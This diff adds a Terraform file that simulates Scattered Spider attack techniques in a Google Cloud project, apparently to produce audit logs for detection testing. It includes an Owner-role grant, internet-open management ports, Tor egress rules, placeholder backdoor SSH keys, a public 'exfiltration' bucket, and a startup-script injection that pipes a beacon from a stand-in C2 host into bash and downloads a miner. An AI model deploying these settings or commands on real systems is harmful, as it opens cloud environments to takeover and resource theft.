@@ -1,0 +1,339 @@
+# ==============================================================================
+# SCATTERED SPIDER (0KTAPUS) TTP SIMULATION - WINDOWS COMPATIBLE
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# TTP: T1110.003 - Brute Force: Password Spraying
+# Simulates multiple failed IAM authentication attempts
+# ------------------------------------------------------------------------------
+resource "null_resource" "scattered_spider_password_spray" {
+  count = var.simulate_credential_access ? 1 : 0
+
+  provisioner "local-exec" {
+    command = <<-EOT
+      gcloud iam service-accounts get-iam-policy fake-user-1@${var.project_id}.iam.gserviceaccount.com --project=${var.project_id}
+      gcloud iam service-accounts get-iam-policy fake-user-2@${var.project_id}.iam.gserviceaccount.com --project=${var.project_id}
+      gcloud iam service-accounts get-iam-policy fake-user-3@${var.project_id}.iam.gserviceaccount.com --project=${var.project_id}
+      gcloud iam service-accounts get-iam-policy fake-user-4@${var.project_id}.iam.gserviceaccount.com --project=${var.project_id}
+      gcloud iam service-accounts get-iam-policy fake-user-5@${var.project_id}.iam.gserviceaccount.com --project=${var.project_id}
+      gcloud compute os-login ssh-keys list --project=${var.project_id}
+      exit 0
+    EOT
+  }
+
+  depends_on = [google_service_account.threat_sim_actor]
+}
+
+# ------------------------------------------------------------------------------
+# TTP: T1087.002 - Account Discovery: Domain Account (IAM enumeration via gcloud)
+# Generates extensive audit logs for IAM reconnaissance
+# ------------------------------------------------------------------------------
+resource "null_resource" "scattered_spider_iam_enum" {
+  count = var.simulate_credential_access ? 1 : 0
+
+  provisioner "local-exec" {
+    command = <<-EOT
+      gcloud iam service-accounts list --project=${var.project_id} --format=json
+      gcloud projects get-iam-policy ${var.project_id} --format=json
+      gcloud iam roles list --project=${var.project_id} --format=json
+      gcloud resource-manager org-policies list --project=${var.project_id}
+      gcloud iam service-accounts list --filter="email:*.gserviceaccount.com" --project=${var.project_id}
+      exit 0
+    EOT
+  }
+}
+
+# ------------------------------------------------------------------------------
+# TTP: T1098 - Account Manipulation (Privilege escalation to Owner role)
+# WARNING: This may fail if executing service account lacks Owner permissions
+# ------------------------------------------------------------------------------
+resource "google_project_iam_member" "scattered_spider_privilege_escalation" {
+  count   = var.enable_dangerous_iam_bindings ? 1 : 0
+  project = var.project_id
+  role    = "roles/owner" # CRITICAL: Direct owner grant (extremely suspicious)
+  member  = "serviceAccount:${google_service_account.threat_sim_actor.email}"
+
+  # Add condition to make this less dangerous (time-limited)
+  condition {
+    title       = "Temporary Owner for Simulation"
+    description = "Auto-expires after simulation period - SHOULD BE FLAGGED BY SECURITY"
+    expression  = "request.time < timestamp('${timeadd(time_static.simulation_start.rfc3339, "${var.simulation_duration_hours}h")}')"
+  }
+}
+
+# Alternative privilege escalation (safer, but still suspicious)
+resource "google_project_iam_member" "scattered_spider_security_admin" {
+  count   = var.simulate_credential_access ? 1 : 0
+  project = var.project_id
+  role    = "roles/iam.securityAdmin" # Can modify IAM policies
+  member  = "serviceAccount:${google_service_account.threat_sim_actor.email}"
+}
+
+resource "google_project_iam_member" "scattered_spider_service_account_admin" {
+  count   = var.simulate_credential_access ? 1 : 0
+  project = var.project_id
+  role    = "roles/iam.serviceAccountAdmin" # Can create/delete SAs
+  member  = "serviceAccount:${google_service_account.threat_sim_actor.email}"
+}
+
+# ------------------------------------------------------------------------------
+# TTP: Create/Modify Firewall Rules (Scenario B observed behavior)
+# Opens management ports to the internet
+# ------------------------------------------------------------------------------
+resource "google_compute_firewall" "scattered_spider_mgmt_access" {
+  count   = var.modify_firewall_rules ? 1 : 0
+  name    = "scenario-b-mgmt-open"
+  network = google_compute_network.scenario-a_target_network.name
+
+  description = "MALICIOUS - Opens HTTPS management interfaces to internet (Scenario B TTP)"
+
+  allow {
+    protocol = "tcp"
+    ports    = ["443", "8443", "9443", "8080"] # Common management ports
+  }
+
+  source_ranges = ["0.0.0.0/0"] # CRITICAL: Fully open to internet
+
+  target_tags = ["management", "admin-console"]
+
+  log_config {
+    metadata = "INCLUDE_ALL_METADATA"
+  }
+}
+
+# Create second suspicious rule (egress to C2)
+resource "google_compute_firewall" "scattered_spider_egress_c2" {
+  count   = var.modify_firewall_rules ? 1 : 0
+  name    = "allow-egress-to-tor"
+  network = google_compute_network.scenario-a_target_network.name
+
+  description = "MALICIOUS - Allows egress to Tor network (C2 communication)"
+  direction   = "EGRESS"
+
+  allow {
+    protocol = "tcp"
+    ports    = ["9001", "9030", "9050", "9051"] # Tor ports
+  }
+
+  destination_ranges = ["0.0.0.0/0"]
+
+  log_config {
+    metadata = "INCLUDE_ALL_METADATA"
+  }
+}
+
+# ------------------------------------------------------------------------------
+# TTP: OS Password Reset (Scenario B technique for VM takeover)
+# Creates a Windows VM, then simulates password reset
+# ------------------------------------------------------------------------------
+resource "google_compute_instance" "scattered_spider_windows_target" {
+  count        = var.create_suspicious_vm ? 1 : 0
+  name         = "windows-target-vm"
+  machine_type = "n1-standard-2"
+  zone         = var.zone
+
+  boot_disk {
+    initialize_params {
+      image = "windows-cloud/windows-2022"
+      size  = 50
+    }
+  }
+
+  network_interface {
+    subnetwork = google_compute_subnetwork.scenario-a_subnet.id
+    access_config {
+      # Public IP for RDP access simulation
+    }
+  }
+
+  service_account {
+    email  = google_service_account.threat_sim_actor.email
+    scopes = ["cloud-platform"]
+  }
+
+  tags = ["windows", "rdp-enabled"]
+
+  metadata = {
+    windows-startup-script-ps1 = "Write-Host 'Windows VM for password reset simulation'"
+  }
+}
+
+# Wait for Windows VM to be ready
+resource "time_sleep" "wait_for_windows_vm" {
+  count           = var.create_suspicious_vm ? 1 : 0
+  create_duration = "180s"
+  depends_on      = [google_compute_instance.scattered_spider_windows_target]
+}
+
+# Simulate password reset (generates audit log: compute.instances.setWindowsPassword)
+resource "null_resource" "scattered_spider_password_reset" {
+  count = var.create_suspicious_vm ? 1 : 0
+
+  provisioner "local-exec" {
+    command = "gcloud compute reset-windows-password ${google_compute_instance.scattered_spider_windows_target[0].name} --zone=${var.zone} --user=compromised-admin --project=${var.project_id} --quiet || echo Password reset attempted"
+  }
+
+  depends_on = [time_sleep.wait_for_windows_vm]
+}
+
+# ------------------------------------------------------------------------------
+# TTP: Create SSH Backdoor (Scenario B lateral movement)
+# Adds suspicious SSH keys to project metadata
+# ------------------------------------------------------------------------------
+resource "random_id" "ssh_key_id" {
+  byte_length = 8
+}
+
+resource "google_compute_project_metadata_item" "scattered_spider_ssh_backdoor" {
+  key   = "ssh-keys"
+  value = "backdoor-user:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8jx9v6ZqK1... backdoor-${random_id.ssh_key_id.hex}@attacker-c2\nscenario-b:ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY... scenario-b@malicious-host"
+
+  # Note: These are truncated/fake keys - they won't work but will generate audit logs
+}
+
+# Alternative: Add SSH key to specific instance
+resource "google_compute_instance" "scattered_spider_backdoor_vm" {
+  count        = var.create_suspicious_vm ? 1 : 0
+  name         = "backdoor-access-host"
+  machine_type = "e2-micro"
+  zone         = var.zone
+
+  boot_disk {
+    initialize_params {
+      image = "ubuntu-os-cloud/ubuntu-2204-lts"
+    }
+  }
+
+  network_interface {
+    subnetwork = google_compute_subnetwork.scenario-a_subnet.id
+    access_config {}
+  }
+
+  metadata = {
+    ssh-keys       = "backdoor:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H1... backdoor@attacker"
+    enable-oslogin = "FALSE" # Suspicious: OS Login disabled
+  }
+
+  service_account {
+    email  = google_service_account.threat_sim_actor.email
+    scopes = ["cloud-platform"]
+  }
+}
+
+# ------------------------------------------------------------------------------
+# TTP: Modify Compute Startup Script (persistence mechanism)
+# Injects malicious startup script via instance metadata update
+# ------------------------------------------------------------------------------
+resource "null_resource" "scattered_spider_startup_script_inject" {
+  count = var.create_suspicious_vm ? 1 : 0
+
+  provisioner "local-exec" {
+    command = "gcloud compute instances add-metadata ${google_compute_instance.scenario-a_rogue_vm[0].name} --zone=${var.zone} --project=${var.project_id} --metadata=startup-script='#!/bin/bash${"\n"}curl -s http://malicious-c2.example.com/beacon.sh | bash${"\n"}wget -O /tmp/miner http://xmrig-pool.example.com/miner && chmod +x /tmp/miner${"\n"}/tmp/miner --url=pool.example.com:3333 &' || echo Metadata injection attempted"
+  }
+
+  depends_on = [google_compute_instance.scenario-a_rogue_vm]
+}
+
+# ------------------------------------------------------------------------------
+# TTP: Launch New Cloud Resources (unauthorized crypto mining VM)
+# Creates a VM with suspicious naming and high CPU configuration
+# ------------------------------------------------------------------------------
+resource "google_compute_instance" "scattered_spider_cryptominer" {
+  count        = var.create_suspicious_vm ? 1 : 0
+  name         = "xmrig-miner-${random_id.ssh_key_id.hex}"
+  machine_type = "c2-standard-4" # CPU-optimized (suspicious for crypto mining)
+  zone         = var.zone
+
+  boot_disk {
+    initialize_params {
+      image = "ubuntu-os-cloud/ubuntu-2204-lts"
+    }
+  }
+
+  network_interface {
+    subnetwork = google_compute_subnetwork.scenario-a_subnet.id
+    access_config {
+      # Public IP for mining pool communication
+    }
+  }
+
+  metadata = {
+    purpose        = "crypto-mining-simulation"
+    mining-pool    = "xmrig-pool-simulation.com"
+    wallet-address = "suspicious-wallet-12345"
+    startup-script = <<-EOT
+      #!/bin/bash
+      echo "[$(date)] Crypto mining simulation started" > /tmp/cryptominer.log
+      # Simulate high CPU usage
+      for i in {1..4}; do
+        yes > /dev/null &
+      done
+    EOT
+  }
+
+  service_account {
+    email  = google_service_account.threat_sim_actor.email
+    scopes = ["cloud-platform"]
+  }
+
+  labels = {
+    threat-simulation = "scenario-b"
+    ttp               = "launch-new-resources"
+    suspicious        = "true"
+    workload          = "cryptomining"
+  }
+
+  scheduling {
+    preemptible       = true # Keep costs low for simulation
+    automatic_restart = false
+  }
+}
+
+# ------------------------------------------------------------------------------
+# TTP: Data Exfiltration via Cloud Storage (GCS bucket abuse)
+# Simulates creating a publicly accessible bucket for data staging
+# ------------------------------------------------------------------------------
+resource "google_storage_bucket" "scattered_spider_exfil_bucket" {
+  count    = var.create_suspicious_vm ? 1 : 0
+  name     = "${var.project_id}-scenario-b-exfil-${random_id.ssh_key_id.hex}"
+  location = var.region
+
+  uniform_bucket_level_access = false # Suspicious: Legacy ACLs
+
+  labels = {
+    purpose    = "data-exfiltration"
+    threat     = "scenario-b"
+    suspicious = "true"
+  }
+
+  lifecycle_rule {
+    action {
+      type = "Delete"
+    }
+    condition {
+      age = 1 # Auto-delete after 1 day
+    }
+  }
+}
+
+# Make bucket publicly readable (VERY SUSPICIOUS)
+resource "google_storage_bucket_iam_member" "scattered_spider_public_access" {
+  count  = var.create_suspicious_vm ? 1 : 0
+  bucket = google_storage_bucket.scattered_spider_exfil_bucket[0].name
+  role   = "roles/storage.objectViewer"
+  member = "allUsers" # CRITICAL: Public read access
+}
+
+# Upload simulated exfiltrated data
+resource "google_storage_bucket_object" "scattered_spider_exfil_data" {
+  count   = var.create_suspicious_vm ? 1 : 0
+  name    = "exfiltrated_credentials_${formatdate("YYYYMMDD", time_static.simulation_start.rfc3339)}.tar.gz"
+  bucket  = google_storage_bucket.scattered_spider_exfil_bucket[0].name
+  content = "SIMULATED_EXFILTRATED_CREDENTIALS_DATABASE"
+
+  metadata = {
+    source          = "internal-database"
+    credential_type = "service_account_keys"
+    record_count    = "1500"
+  }
+}
